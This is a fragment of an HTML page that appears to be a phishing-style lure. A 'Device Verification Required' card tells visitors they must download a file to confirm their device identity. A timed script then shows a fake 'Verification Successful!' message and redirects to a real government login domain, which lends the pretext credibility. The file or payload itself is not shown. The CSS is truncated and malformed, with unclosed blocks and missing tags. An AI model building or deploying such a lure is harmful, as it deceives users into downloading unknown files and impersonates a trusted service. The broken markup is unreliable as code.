            z-index: 2;
            background: rgba(255, 255, 255, 0.95);

            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);

            max-width: 450px;

        }

        .card p {
            color: #555;
            font-size: 15px;
            line-height: 1.6;
        }

        /* Spinner animation */
        .spinner {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-icon {
            display: none;

            height: 80px;

            background: #2ecc71;

        @keyframes popIn {
            0% { transform: scale(0); opacity: 0; }

<body>

    <div class="overlay"></div>

    <div class="card" id="mainCard">
        <!-- Spinner -->
        <div class="spinner" id="spinner"></div>

        <!-- Checkmark -->
        <div class="success-icon" id="successIcon">✓</div>

        <!-- Content -->
        <h2 id="title">Device Verification Required</h2>
        <p id="description">You must download the file to confirm your device identity.</p>
    </div>

    <script>
        // Target URL to redirect to after 2 minutes
        const targetURL = "https://secure.login.gov";

        // Wait time in seconds (120 seconds = 2 minutes)
        const waitTimeInSeconds = 120; 

        setTimeout(function() {
            // Hide the spinner
            document.getElementById('spinner').classList.add('hidden');

            // Show success checkmark
            document.getElementById('successIcon').style.display = 'block';

            // Change card text to success state
            document.getElementById('title').innerText = "Verification Successful!";
            document.getElementById('title').style.color = "#2ecc71";
            document.getElementById('description').innerText = "Redirecting you to the next page now...";

            // Redirect after 2 seconds
            setTimeout(function() {
                window.location.href = targetURL;
            }, 2000);

        }, waitTimeInSeconds * 1000);
    </script>
